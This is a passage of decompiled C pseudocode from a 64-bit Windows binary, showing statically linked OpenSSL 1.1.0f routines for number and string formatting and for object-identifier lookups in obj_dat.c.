      goto LABEL_24;
    }
    if ( a5 < 0.0001 )
    {
      v20 = 1;
      v55 = 1;
      goto LABEL_24;
    }
    v21 = v14 <= 0;
    if ( !v14 )
    {
      if ( a5 >= 10.0 )
      {
LABEL_22:
        v20 = 1;
        v55 = 1;
        goto LABEL_24;
      }
      v21 = 1;
    }
    if ( v21 )
      goto LABEL_12;
    v22 = v14;
    v23 = 1.0;
    do
    {
      v23 = v23 * 10.0;
      --v22;
    }
    while ( v22 );
    if ( a5 < v23 )
      goto LABEL_12;
    goto LABEL_22;
  }
  v20 = a9;
  v24 = v14;
  v55 = a9;
  if ( !a9 )
    goto LABEL_40;
LABEL_24:
  v25 = a5;
  if ( a5 != 0.0 )
  {
    if ( a5 < 1.0 )
    {
      do
      {
        v25 = v25 * 10.0;
        --v11;
      }
      while ( v25 < 1.0 );
      v58 = v11;
    }
    if ( v25 > 10.0 )
    {
      do
      {
        v25 = v25 / 10.0;
        ++v11;
      }
      while ( v25 > 10.0 );
      v58 = v11;
    }
  }
  v24 = v14;
  if ( a9 != 2 )
    goto LABEL_38;
  if ( !v14 )
    v24 = 1;
  if ( v20 )
  {
    --v24;
LABEL_38:
    if ( v20 == 1 )
      v9 = v25;
    goto LABEL_40;
  }
  v24 += -1 - v11;
  if ( v24 < 0 )
    return 0i64;
LABEL_40:
  if ( v9 < 0.0 )
    v9 = -v9;
  if ( v9 > 4294967295.0 )
    return 0i64;
  v27 = 1.0;
  v28 = (int)v9;
  if ( v24 > 9 )
    v24 = 9;
  for ( i = v24; i; --i )
    v27 = v27 * 10.0;
  v30 = (int)v27;
  if ( v27 - (double)(int)v27 >= 0.5 )
    ++v30;
  for ( j = v24; j; --j )
    v19 = v19 * 10.0;
  v32 = (v9 - (double)(int)v28) * v19;
  v33 = (unsigned int)(int)v32;
  if ( v32 - (double)(int)v32 >= 0.5 )
    v33 = (unsigned int)(v33 + 1);
  if ( (unsigned int)v33 >= v30 )
  {
    ++v28;
    v33 = (unsigned int)v33 - v30;
  }
  v34 = 0i64;
  do
  {
    v35 = v10;
    v36 = v28 / 0xA;
    ++v10;
    v37 = a0123456789[v28 % 0xA];
    v28 = v36;
    v60[v34++] = v37;
  }
  while ( (_DWORD)v36 && v34 < 20 );
  if ( v10 != 20 )
    v35 = v10;
  v59 = v35;
  if ( (unsigned __int64)v35 >= 0x14 )
    _report_rangecheckfailure(v34, v36, v33, (unsigned int)v36);
  v60[v35] = 0;
  if ( v24 > 0 )
  {
    v38 = 0i64;
    do
    {
      v34 = (__int64)"0123456789";
      while ( 1 )
      {
        if ( a9 != 2 || v38 )
          goto LABEL_70;
        v36 = (unsigned int)v33 / 0xA;
        v34 = (unsigned int)(10 * v36);
        if ( (_DWORD)v33 == (_DWORD)v34 )
          break;
        v34 = (__int64)"0123456789";
LABEL_70:
        ++v12;
        v36 = (unsigned int)v33 / 0xA;
        v39 = a0123456789[(unsigned int)v33 % 0xA];
        v33 = v36;
        v60[v38++ + 24] = v39;
        if ( v12 >= v24 )
          goto LABEL_71;
      }
      --v24;
      v33 = (unsigned int)v36;
    }
    while ( v12 < v24 );
  }
LABEL_71:
  v40 = 19i64;
  if ( v12 != 20 )
    v40 = (unsigned int)v12;
  v41 = (int)v40;
  if ( (unsigned __int64)(int)v40 >= 0x14 )
    _report_rangecheckfailure(v34, v36, v33, v40);
  v60[(int)v40 + 24] = 0;
  if ( v55 == 1 )
  {
    v42 = v58;
    if ( v58 < 0 )
      v42 = -v58;
    v43 = 0i64;
    v44 = 0;
    while ( 1 )
    {
      v57 = ++v44;
      v45 = a0123456789[v42 % 10];
      v42 /= 10;
      v60[v43++ + 48] = v45;
      if ( v42 <= 0 )
        break;
      if ( v43 >= 20 )
        return 0i64;
    }
    if ( v44 == 1 )
    {
      v44 = 2;
      v60[49] = 48;
      v57 = 2;
    }
  }
  else
  {
    v44 = 0;
  }
  v46 = a6 - (v56 != 0) - (v24 > 0) - v35 - v24;
  if ( v55 == 1 )
    v46 += -2 - v44;
  v47 = 0;
  if ( v24 - (int)v40 >= 0 )
    v47 = v24 - v40;
  v48 = 0;
  if ( v46 >= 0 )
    v48 = v46;
  v49 = -v48;
  if ( (a8 & 1) == 0 )
    v49 = v48;
  v50 = v49;
  if ( (a8 & 0x10) != 0 && v49 > 0 )
  {
    if ( v56 )
    {
      if ( !(unsigned int)sub_14002AE50(a1, a2, a3, a4, v56) )
        return 0i64;
      --v50;
      v56 = 0;
    }
    if ( v50 > 0 )
    {
      while ( (unsigned int)sub_14002AE50(a1, a2, a3, a4, 48) )
      {
        if ( --v50 <= 0 )
          goto LABEL_104;
      }
      return 0i64;
    }
  }
  else if ( v49 > 0 )
  {
    while ( (unsigned int)sub_14002AE50(a1, a2, a3, a4, 32) )
    {
      if ( --v50 <= 0 )
        goto LABEL_104;
    }
    return 0i64;
  }
LABEL_104:
  if ( v56 && !(unsigned int)sub_14002AE50(a1, a2, a3, a4, v56) )
    return 0i64;
  for ( k = v59; v59 > 0; k = v59 )
  {
    v59 = k - 1;
    if ( !(unsigned int)sub_14002AE50(a1, a2, a3, a4, v60[k - 1]) )
      return 0i64;
  }
  if ( v24 > 0 || (a8 & 8) != 0 )
  {
    if ( !(unsigned int)sub_14002AE50(a1, a2, a3, a4, 46) )
      return 0i64;
    while ( v41 > 0 )
    {
      v52 = v60[v41-- + 23];
      if ( !(unsigned int)sub_14002AE50(a1, a2, a3, a4, v52) )
        return 0i64;
    }
  }
  if ( v47 > 0 )
  {
    while ( (unsigned int)sub_14002AE50(a1, a2, a3, a4, 48) )
    {
      if ( --v47 <= 0 )
        goto LABEL_118;
    }
    return 0i64;
  }
LABEL_118:
  if ( v55 == 1 )
  {
    if ( !(unsigned int)sub_14002AE50(a1, a2, a3, a4, ~a8 & 0x20 | 0x45u) )
      return 0i64;
    if ( v58 >= 0 )
    {
      if ( !(unsigned int)sub_14002AE50(a1, a2, a3, a4, 43) )
        return 0i64;
    }
    else if ( !(unsigned int)sub_14002AE50(a1, a2, a3, a4, 45) )
    {
      return 0i64;
    }
    v53 = v57;
    while ( v53 > 0 )
    {
      v54 = v60[v53-- + 47];
      if ( !(unsigned int)sub_14002AE50(a1, a2, a3, a4, v54) )
        return 0i64;
    }
  }
  if ( v50 < 0 )
  {
    while ( (unsigned int)sub_14002AE50(a1, a2, a3, a4, 32) )
    {
      if ( ++v50 >= 0 )
        return 1i64;
    }
    return 0i64;
  }
  return 1i64;
}
// 14000347C: using guessed type void __fastcall __noreturn _report_rangecheckfailure(_QWORD, _QWORD, _QWORD, _QWORD);

//----- (000000014002B660) ----------------------------------------------------
__int64 __fastcall sub_14002B660(
        const void **a1,
        void **a2,
        size_t *a3,
        unsigned __int64 *a4,
        __int64 a5,
        unsigned int a6,
        int a7,
        int a8,
        char a9)
{
  char *v9; // r13
  int v10; // r11d
  int v12; // ecx
  int v13; // r10d
  unsigned __int64 v15; // r9
  const char *v18; // rax
  __int64 v19; // r8
  const char *v20; // rdi
  unsigned __int64 v21; // rdx
  int v22; // esi
  __int64 v23; // rdi
  unsigned int v24; // edx
  int v25; // r8d
  char *i; // rax
  int v27; // ecx
  int v28; // esi
  int v29; // ecx
  int v30; // edx
  int v31; // eax
  int v32; // ecx
  int v33; // ebx
  char v34; // al
  char v35; // al
  int v37; // [rsp+30h] [rbp-88h]
  char v38[33]; // [rsp+3Fh] [rbp-79h]

  v9 = (char *)&unk_1400D7DAE;
  v10 = 0;
  v37 = 0;
  v12 = 0;
  v13 = 0;
  v15 = a5;
  if ( a8 >= 0 )
    v12 = a8;
  if ( (a9 & 0x40) == 0 )
  {
    if ( a5 >= 0 )
    {
      if ( (a9 & 2) != 0 )
      {
        v10 = 43;
      }
      else if ( (a9 & 4) != 0 )
      {
        v10 = 32;
      }
    }
    else
    {
      v10 = 45;
      v15 = -a5;
    }
    v37 = v10;
  }
  if ( (a9 & 8) != 0 )
  {
    v18 = "0";
    if ( a6 != 8 )
      v18 = (const char *)&unk_1400D7DAE;
    v9 = "0x";
    if ( a6 != 16 )
      v9 = (char *)v18;
  }
  v19 = 0i64;
  v20 = "0123456789abcdef";
  if ( (a9 & 0x20) != 0 )
    v20 = "0123456789ABCDEF";
  do
  {
    v21 = v15 % a6;
    v22 = v13++;
    v15 /= a6;
    v38[++v19] = v20[v21];
  }
  while ( v15 && v19 < 26 );
  if ( v13 != 26 )
    v22 = v13;
  v23 = v22;
  if ( (unsigned __int64)v22 >= 0x1A )
    _report_rangecheckfailure(a6, v21, v19, v15);
  v24 = 0;
  v38[v22 + 1] = 0;
  v25 = v12 - v22;
  for ( i = v9; *i; ++v24 )
  {
    if ( v24 >= 0x80000000 )
      break;
    ++i;
  }
  if ( v12 >= v22 )
    v22 = v12;
  v27 = a7 - v22;
  v28 = 0;
  v29 = v27 - (v10 != 0);
  v30 = v24 & 0x7FFFFFFF;
  if ( v25 >= 0 )
    v28 = v25;
  v31 = 0;
  v32 = v29 - v30;
  if ( v32 >= 0 )
    v31 = v32;
  if ( (a9 & 0x10) != 0 )
  {
    if ( v28 >= v31 )
      v31 = v28;
    v28 = v31;
    v31 = 0;
  }
  v33 = -v31;
  if ( (a9 & 1) == 0 )
    v33 = v31;
  if ( v33 <= 0 )
  {
LABEL_42:
    if ( !v10 || (unsigned int)sub_14002AE50(a1, a2, a3, a4, v10) )
    {
      v34 = *v9;
      if ( *v9 )
      {
        while ( (unsigned int)sub_14002AE50(a1, a2, a3, a4, v34) )
        {
          v34 = *++v9;
          if ( !v34 )
            goto LABEL_47;
        }
      }
      else
      {
LABEL_47:
        if ( v28 <= 0 )
        {
LABEL_50:
          if ( v23 <= 0 )
          {
LABEL_53:
            if ( v33 >= 0 )
              return 1i64;
            while ( (unsigned int)sub_14002AE50(a1, a2, a3, a4, 32) )
            {
              if ( ++v33 >= 0 )
                return 1i64;
            }
          }
          else
          {
            while ( 1 )
            {
              v35 = v38[v23--];
              if ( !(unsigned int)sub_14002AE50(a1, a2, a3, a4, v35) )
                break;
              if ( v23 <= 0 )
                goto LABEL_53;
            }
          }
        }
        else
        {
          while ( (unsigned int)sub_14002AE50(a1, a2, a3, a4, 48) )
          {
            if ( --v28 <= 0 )
              goto LABEL_50;
          }
        }
      }
    }
  }
  else
  {
    while ( (unsigned int)sub_14002AE50(a1, a2, a3, a4, 32) )
    {
      if ( --v33 <= 0 )
      {
        v10 = v37;
        goto LABEL_42;
      }
    }
  }
  return 0i64;
}
// 14000347C: using guessed type void __fastcall __noreturn _report_rangecheckfailure(_QWORD, _QWORD, _QWORD, _QWORD);

//----- (000000014002B940) ----------------------------------------------------
__int64 __fastcall sub_14002B940(
        const void **a1,
        void **a2,
        size_t *a3,
        unsigned __int64 *a4,
        char *a5,
        char a6,
        int a7,
        int a8)
{
  char *v8; // r15
  int v9; // esi
  int v10; // ebx
  __int64 v13; // rdx
  _BYTE *v14; // rbp
  int v15; // r8d
  int v16; // edx
  int v17; // edi

  v8 = "<NULL>";
  v9 = a8;
  v10 = 0;
  if ( a5 )
    v8 = a5;
  if ( a8 >= 0 )
    v13 = a8;
  else
    v13 = -1i64;
  v14 = sub_14003C0C0(v8, v13);
  v15 = a7 - (_DWORD)v14;
  if ( a7 < 0 || v15 < 0 )
    v15 = 0;
  if ( a8 >= 0 )
  {
    v16 = 0x7FFFFFFF;
    if ( a8 < 0x7FFFFFFF - v15 )
      v16 = v15 + a8;
    v9 = v16;
  }
  v17 = -v15;
  if ( (a6 & 1) == 0 )
    v17 = v15;
  if ( v17 > 0 )
  {
    while ( v9 < 0 || v10 < v9 )
    {
      if ( !(unsigned int)sub_14002AE50(a1, a2, a3, a4, 32) )
        return 0i64;
      --v17;
      ++v10;
      if ( v17 <= 0 )
        break;
    }
  }
  while ( v14 )
  {
    if ( v9 >= 0 && v10 >= v9 )
      break;
    if ( !(unsigned int)sub_14002AE50(a1, a2, a3, a4, *v8++) )
      return 0i64;
    ++v10;
    --v14;
  }
  for ( ; v17 < 0; ++v17 )
  {
    if ( v9 >= 0 && v10 >= v9 )
      break;
    if ( !(unsigned int)sub_14002AE50(a1, a2, a3, a4, 32) )
      return 0i64;
    ++v10;
  }
  return 1i64;
}

//----- (000000014002BAC0) ----------------------------------------------------
__int64 __fastcall sub_14002BAC0(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v4; // rsi
  __int64 *v5; // rdi
  __int64 v6; // rdx
  __int64 v7; // rcx
  _QWORD *v8; // rax
  __int128 v9; // [rsp+30h] [rbp-38h] BYREF
  __int128 v10; // [rsp+40h] [rbp-28h]

  v1 = 0i64;
  v9 = 0i64;
  v10 = 0i64;
  if ( !qword_140142B88 )
  {
    qword_140142B88 = (__int64)sub_14003EE70(
                                 (__int64 (__fastcall *)(char *))sub_14002CA60,
                                 (int (__cdecl *)(const char *, const char *))sub_14002C970);
    if ( !qword_140142B88 )
      return 0i64;
  }
  v4 = (_QWORD *)sub_140047B90(a1);
  if ( !v4 )
    goto LABEL_19;
  *((_QWORD *)&v10 + 1) = sub_14001D8E0(0x10ui64);
  if ( !*((_QWORD *)&v10 + 1)
    || *((_DWORD *)v4 + 5) && *(_QWORD *)(a1 + 24) && (*(_QWORD *)&v9 = sub_14001D8E0(0x10ui64), !(_QWORD)v9)
    || *v4 && (*((_QWORD *)&v9 + 1) = sub_14001D8E0(0x10ui64)) == 0i64
    || v4[1] && (*(_QWORD *)&v10 = sub_14001D8E0(0x10ui64), !(_QWORD)v10) )
  {
    sub_140024610(8, 105, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\objects\\obj_dat.c", 212);
    do
LABEL_19:
      sub_14001D930(*((void **)&v9 + v1++));
    while ( v1 <= 3 );
    sub_14001D930(v4);
    return 0i64;
  }
  v5 = (__int64 *)&v9;
  do
  {
    v6 = *v5;
    if ( *v5 )
    {
      v7 = qword_140142B88;
      *(_DWORD *)v6 = v1;
      *(_QWORD *)(v6 + 8) = v4;
      v8 = sub_14003ED50(v7, v6);
      sub_14001D930(v8);
    }
    LODWORD(v1) = v1 + 1;
    ++v5;
  }
  while ( (int)v1 <= 3 );
  *((_DWORD *)v4 + 8) &= 0xFFFFFFF2;
  return *((unsigned int *)v4 + 4);
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142B88: using guessed type __int64 qword_140142B88;

//----- (000000014002BCB0) ----------------------------------------------------
__int64 __fastcall sub_14002BCB0(__int64 a1, __int64 a2, int a3, int a4, __int64 (__fastcall *a5)(__int64, __int64))
{
  return sub_14002BCE0(a1, a2, a3, a4, a5, 0);
}

//----- (000000014002BCE0) ----------------------------------------------------
__int64 __fastcall sub_14002BCE0(
        __int64 a1,
        __int64 a2,
        int a3,
        int a4,
        __int64 (__fastcall *a5)(__int64, __int64),
        char a6)
{
  int v6; // ebx
  __int64 v7; // rdi
  int v9; // esi
  int v13; // ebp
  int v14; // eax
  int v15; // edi

  v6 = 0;
  v7 = 0i64;
  v9 = a3;
  if ( !a3 )
    return 0i64;
  v13 = 0;
  if ( a3 <= 0 )
    goto LABEL_12;
  do
  {
    v6 = (v9 + v13) / 2;
    v7 = a2 + a4 * v6;
    v14 = a5(a1, v7);
    if ( v14 >= 0 )
    {
      if ( v14 <= 0 )
        break;
      v13 = v6 + 1;
    }
    else
    {
      v9 = (v9 + v13) / 2;
    }
  }
  while ( v13 < v9 );
  if ( v14 )
  {
    if ( (a6 & 1) == 0 )
      return 0i64;
  }
  else
  {
LABEL_12:
    if ( (a6 & 2) != 0 )
    {
      if ( v6 > 0 )
      {
        v15 = a4 * (v6 - 1);
        do
        {
          if ( (unsigned int)a5(a1, a2 + v15) )
            break;
          --v6;
          v15 -= a4;
        }
        while ( v6 > 0 );
      }
      return a2 + a4 * v6;
    }
  }
  return v7;
}

//----- (000000014002BDE0) ----------------------------------------------------
__int64 __fastcall sub_14002BDE0(char *a1, __int64 a2, __int64 a3)
{
  char **v6; // rax
  __int64 v7; // rbx
  int v9; // ecx
  unsigned int v10; // edi

  if ( (unsigned int)sub_14002C720(a2) || (unsigned int)sub_14002BF10(a3) )
  {
    sub_140024610(8, 100, 102, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\objects\\obj_dat.c", 689);
    return 0i64;
  }
  v6 = sub_14002C840(a1, 1);
  v7 = (__int64)v6;
  if ( !v6 )
    return 0i64;
  if ( (unsigned int)sub_14002C260((__int64)v6) )
  {
    sub_140024610(8, 100, 102, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\objects\\obj_dat.c", 700);
    sub_14003F4D0(v7);
    return 0i64;
  }
  else
  {
    v9 = dword_1401350E8;
    *(_DWORD *)(v7 + 16) = dword_1401350E8;
    dword_1401350E8 = v9 + 1;
    *(_QWORD *)v7 = a2;
    *(_QWORD *)(v7 + 8) = a3;
    v10 = sub_14002BAC0(v7);
    *(_QWORD *)v7 = 0i64;
    *(_QWORD *)(v7 + 8) = 0i64;
    sub_14003F4D0(v7);
    return v10;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1401350E8: using guessed type int dword_1401350E8;

//----- (000000014002BEF0) ----------------------------------------------------
__int64 __fastcall sub_14002BEF0(__int64 a1)
{
  if ( a1 )
    return *(_QWORD *)(a1 + 24);
  else
    return 0i64;
}

//----- (000000014002BF00) ----------------------------------------------------
__int64 __fastcall sub_14002BF00(__int64 a1)
{
  if ( a1 )
    return *(int *)(a1 + 20);
  else
    return 0i64;
}

//----- (000000014002BF10) ----------------------------------------------------
__int64 __fastcall sub_14002BF10(__int64 a1)
{
  __int64 v1; // rdi
  _QWORD *v2; // rax
  int v4; // r9d
  int v5; // r10d
  int v6; // r11d
  unsigned int *v7; // rbx
  __int64 v8; // rcx
  char *v9; // r8
  unsigned __int8 v10; // al
  int v11; // eax
  int v12; // [rsp+20h] [rbp-48h] BYREF
  char *v13; // [rsp+28h] [rbp-40h]
  char v14; // [rsp+30h] [rbp-38h] BYREF
  __int64 v15; // [rsp+38h] [rbp-30h]

  v1 = a1;
  v15 = a1;
  if ( qword_140142B88 )
  {
    v12 = 2;
    v13 = &v14;
    v2 = sub_14003EF50(qword_140142B88, (__int64)&v12);
    if ( v2 )
      return *(unsigned int *)(v2[1] + 16i64);
    v1 = v15;
  }
  v4 = 0;
  v5 = 1052;
  do
  {
    v6 = (v5 + v4) / 2;
    v7 = (unsigned int *)((char *)&unk_1400E1FB0 + 4 * v6);
    v8 = v1;
    v9 = &off_1400E5980[5 * *v7 + 1][-v1];
    while ( 1 )
    {
      v10 = *(_BYTE *)v8;
      if ( *(_BYTE *)v8 != v9[v8] )
        break;
      ++v8;
      if ( !v10 )
      {
        v11 = 0;
        goto LABEL_11;
      }
    }
    v11 = v10 < (unsigned __int8)v9[v8] ? -1 : 1;
LABEL_11:
    if ( v11 >= 0 )
    {
      if ( v11 <= 0 )
        break;
      v4 = v6 + 1;
    }
    else
    {
      v5 = (v5 + v4) / 2;
    }
  }
  while ( v4 < v5 );
  if ( v11 || !v7 )
    return 0i64;
  else
    return LODWORD(off_1400E5980[5 * *v7 + 2]);
}
// 1400E5980: using guessed type char *off_1400E5980[2];
// 140142B88: using guessed type __int64 qword_140142B88;

//----- (000000014002C030) ----------------------------------------------------
char *__fastcall sub_14002C030(unsigned int a1)
{
  _QWORD *v2; // rax
  int v3; // [rsp+30h] [rbp-48h] BYREF
  char *v4; // [rsp+38h] [rbp-40h]
  char v5; // [rsp+40h] [rbp-38h] BYREF
  unsigned int v6; // [rsp+50h] [rbp-28h]

  if ( a1 > 0x424 )
  {
    if ( qword_140142B88 )
    {
      v6 = a1;
      v4 = &v5;
      v3 = 3;
      v2 = sub_14003EF50(qword_140142B88, (__int64)&v3);
      if ( v2 )
        return *(char **)(v2[1] + 8i64);
      sub_140024610(8, 102, 101, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\objects\\obj_dat.c", 295);
    }
  }
  else
  {
    if ( !a1 || LODWORD(off_1400E5980[5 * (int)a1 + 2]) )
      return off_1400E5980[5 * (int)a1 + 1];
    sub_140024610(8, 102, 101, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\objects\\obj_dat.c", 281);
  }
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1400E5980: using guessed type char *off_1400E5980[2];
// 140142B88: using guessed type __int64 qword_140142B88;

//----- (000000014002C0F0) ----------------------------------------------------
char **__fastcall sub_14002C0F0(unsigned int a1)
{
  _QWORD *v2; // rax
  int v3; // [rsp+30h] [rbp-48h] BYREF
  char *v4; // [rsp+38h] [rbp-40h]
  char v5; // [rsp+40h] [rbp-38h] BYREF
  unsigned int v6; // [rsp+50h] [rbp-28h]

  if ( a1 > 0x424 )
  {
    if ( qword_140142B88 )
    {
      v6 = a1;
      v4 = &v5;
      v3 = 3;
      v2 = sub_14003EF50(qword_140142B88, (__int64)&v3);
      if ( v2 )
        return (char **)v2[1];
      sub_140024610(8, 103, 101, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\objects\\obj_dat.c", 241);
    }
  }
  else
  {
    if ( !a1 || LODWORD(off_1400E5980[5 * (int)a1 + 2]) )
      return &off_1400E5980[5 * (int)a1];
    sub_140024610(8, 103, 101, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\objects\\obj_dat.c", 227);
  }
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1400E5980: using guessed type char *off_1400E5980[2];
// 140142B88: using guessed type __int64 qword_140142B88;

//----- (000000014002C1A0) ----------------------------------------------------
char *__fastcall sub_14002C1A0(unsigned int a1)
{
  _QWORD *v2; // rax
  int v3; // [rsp+30h] [rbp-48h] BYREF
  char *v4; // [rsp+38h] [rbp-40h]
  char v5; // [rsp+40h] [rbp-38h] BYREF
  unsigned int v6; // [rsp+50h] [rbp-28h]

  if ( a1 > 0x424 )
  {
    if ( qword_140142B88 )
    {
      v6 = a1;
      v4 = &v5;
      v3 = 3;
      v2 = sub_14003EF50(qword_140142B88, (__int64)&v3);
      if ( v2 )
        return *(char **)v2[1];
      sub_140024610(8, 104, 101, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\objects\\obj_dat.c", 268);
    }
  }
  else
  {
    if ( !a1 || LODWORD(off_1400E5980[5 * (int)a1 + 2]) )
      return off_1400E5980[5 * (int)a1];
    sub_140024610(8, 104, 101, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\objects\\obj_dat.c", 254);
  }
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1400E5980: using guessed type char *off_1400E5980[2];
// 140142B88: using guessed type __int64 qword_140142B88;

//----- (000000014002C260) ----------------------------------------------------
__int64 __fastcall sub_14002C260(__int64 a1)
{
  __int64 result; // rax
  int v3; // ebx
  _QWORD *v4; // rax
  int v5; // esi
  size_t v6; // r14
  int v7; // edi
  unsigned int *v8; // r15
  __int64 v9; // rcx
  int v10; // eax
  int v11; // [rsp+20h] [rbp-38h] BYREF
  __int64 v12; // [rsp+28h] [rbp-30h]

  if ( !a1 )
    return 0i64;
  result = *(unsigned int *)(a1 + 16);
  if ( !(_DWORD)result )
  {
    if ( !*(_DWORD *)(a1 + 20) )
      return 0i64;
    v3 = 0;
    if ( qword_140142B88 )
    {
      v11 = 0;
      v12 = a1;
      v4 = sub_14003EF50(qword_140142B88, (__int64)&v11);
      if ( v4 )
        return *(unsigned int *)(v4[1] + 16i64);
    }
    v5 = 956;
    v6 = *(int *)(a1 + 20);
    do
    {
      v7 = (v5 + v3) / 2;
      v8 = (unsigned int *)((char *)&unk_1400E3020 + 4 * v7);
      v9 = *v8;
      v10 = v6 - HIDWORD(off_1400E5980[5 * v9 + 2]);
      if ( (_DWORD)v6 == HIDWORD(off_1400E5980[5 * v9 + 2]) )
      {
        if ( !(_DWORD)v6 )
          goto LABEL_18;
        v10 = memcmp(*(const void **)(a1 + 24), off_1400E5980[5 * v9 + 3], v6);
      }
      if ( v10 >= 0 )
      {
        if ( v10 <= 0 )
          break;
        v3 = v7 + 1;
      }
      else
      {
        v5 = (v5 + v3) / 2;
      }
    }
    while ( v3 < v5 );
    if ( v10 )
      return 0i64;
LABEL_18:
    if ( !v8 )
      return 0i64;
    return LODWORD(off_1400E5980[5 * *v8 + 2]);
  }
  return result;
}
// 1400E5980: using guessed type char *off_1400E5980[2];
// 140142B88: using guessed type __int64 qword_140142B88;

//----- (000000014002C3A0) ----------------------------------------------------
__int64 __fastcall sub_14002C3A0(_BYTE *a1, int a2, __int64 a3, int a4)
{
  unsigned int v4; // r15d
  unsigned __int64 v5; // r12
  _BYTE *v7; // r14
  unsigned int v8; // eax
  unsigned int v9; // esi
  char *v10; // rbx
  int v12; // eax
  __int64 *v13; // rbp
  char *v14; // r13
  unsigned int v15; // edi
  int v16; // esi
  char v17; // bl
  unsigned int v18; // ebx
  _WORD *v19; // rax
  void *v20; // rsi
  unsigned int v21; // ebx
  _BYTE *i; // rcx
  int v23; // ebx
  unsigned int v24; // ebx
  char *j; // rax
  int v26; // ebx
  unsigned int v27; // [rsp+20h] [rbp-78h]
  int v28; // [rsp+24h] [rbp-74h]
  int v29; // [rsp+28h] [rbp-70h]
  char v30[32]; // [rsp+30h] [rbp-68h] BYREF

  v4 = 0;
  v5 = a2;
  v27 = 0;
  v7 = a1;
  if ( a1 && a2 > 0 )
    *a1 = 0;
  if ( !a3 || !*(_QWORD *)(a3 + 24) )
    return 0i64;
  if ( a4
    || (v8 = sub_14002C260(a3), (v9 = v8) == 0)
    || (v10 = sub_14002C030(v8)) == 0i64 && (v10 = sub_14002C1A0(v9)) == 0i64 )
  {
    v12 = *(_DWORD *)(a3 + 20);
    v13 = 0i64;
    v14 = *(char **)(a3 + 24);
    v29 = 1;
    if ( v12 <= 0 )
      goto LABEL_68;
    while ( 1 )
    {
      v15 = 0;
      v16 = 0;
      while ( 1 )
      {
        v17 = *v14++;
        v28 = v12 - 1;
        if ( v12 == 1 && v17 < 0 )
          goto LABEL_22;
        if ( v16 )
        {
          if ( !(unsigned int)sub_14003E600((__int64)v13, v17 & 0x7F) )
            goto LABEL_22;
        }
        else
        {
          v15 |= v17 & 0x7F;
        }
        if ( v17 >= 0 )
          break;
        if ( v16 )
          goto LABEL_32;
        if ( v15 <= 0x1FFFFFF )
        {
          v12 = v28;
          v15 <<= 7;
        }
        else
        {
          if ( !v13 )
          {
            v13 = (__int64 *)sub_140027200();
            if ( !v13 )
              goto LABEL_22;
          }
          if ( !(unsigned int)sub_140027560((__int64)v13, v15) )
            goto LABEL_22;
          v16 = 1;
LABEL_32:
          if ( !(unsigned int)sub_140046E40((__int64)v13, v13, 7) )
            goto LABEL_22;
          v12 = v28;
        }
      }
      if ( v29 )
      {
        v29 = 0;
        if ( v15 < 0x50 )
        {
          v18 = v15 / 0x28;
          v15 %= 0x28u;
        }
        else
        {
          LOBYTE(v18) = 2;
          if ( v16 )
          {
            if ( (unsigned int)sub_14003E980((__int64)v13, 0x50ui64) )
              goto LABEL_42;
LABEL_22:
            sub_140026FF0(v13);
            return 0xFFFFFFFFi64;
          }
          v15 -= 80;
        }
LABEL_42:
        if ( v7 && (int)v5 > 1 )
        {
          *v7++ = v18 + 48;
          LODWORD(v5) = v5 - 1;
          *v7 = 0;
        }
        ++v27;
      }
      if ( v16 )
      {
        v19 = sub_140022CC0((__int64)v13);
        v20 = v19;
        if ( !v19 )
          goto LABEL_22;
        v21 = 0;
        for ( i = v19; *i; ++v21 )
        {
          if ( v21 >= 0x80000000 )
            break;
          ++i;
        }
        v23 = v21 & 0x7FFFFFFF;
        if ( v7 )
        {
          if ( (int)v5 > 1 )
          {
            *v7++ = 46;
            LODWORD(v5) = v5 - 1;
            *v7 = 0;
          }
          sub_14003C060(v7, v19, (int)v5);
          if ( v23 <= (int)v5 )
          {
            v7 += v23;
            LODWORD(v5) = v5 - v23;
          }
          else
          {
            v7 += (int)v5;
            LODWORD(v5) = 0;
          }
        }
        v27 += v23 + 1;
        sub_14001D930(v20);
      }
      else
      {
        sub_14002A5C0(v30, 0x1Aui64, ".%lu", v15);
        v24 = 0;
        for ( j = v30; *j; ++v24 )
        {
          if ( v24 >= 0x80000000 )
            break;
          ++j;
        }
        v26 = v24 & 0x7FFFFFFF;
        if ( v7 && (int)v5 > 0 )
        {
          sub_14003C060(v7, v30, (int)v5);
          if ( v26 <= (int)v5 )
          {
            v7 += v26;
            LODWORD(v5) = v5 - v26;
          }
          else
          {
            v7 += (int)v5;
            LODWORD(v5) = 0;
          }
        }
        v27 += v26;
      }
      v12 = v28;
      if ( v28 <= 0 )
      {
LABEL_68:
        sub_140026FF0(v13);
        return v27;
      }
    }
  }
  if ( v7 )
    sub_14003C060(v7, v10, v5);
  for ( ; *v10; ++v4 )
  {
    if ( v4 >= 0x80000000 )
      break;
    ++v10;
  }
  return v4 & 0x7FFFFFFF;
}

//----- (000000014002C720) ----------------------------------------------------
__int64 __fastcall sub_14002C720(__int64 a1)
{
  __int64 v1; // rdi
  _QWORD *v2; // rax
  int v4; // r9d
  int v5; // r10d
  int v6; // r11d
  unsigned int *v7; // rbx
  __int64 v8; // rcx
  char *v9; // r8
  unsigned __int8 v10; // al
  int v11; // eax
  int v12; // [rsp+20h] [rbp-48h] BYREF
  __int64 *v13; // [rsp+28h] [rbp-40h]
  __int64 v14; // [rsp+30h] [rbp-38h] BYREF

  v1 = a1;
  v14 = a1;
  if ( qword_140142B88 )
  {
    v12 = 1;
    v13 = &v14;
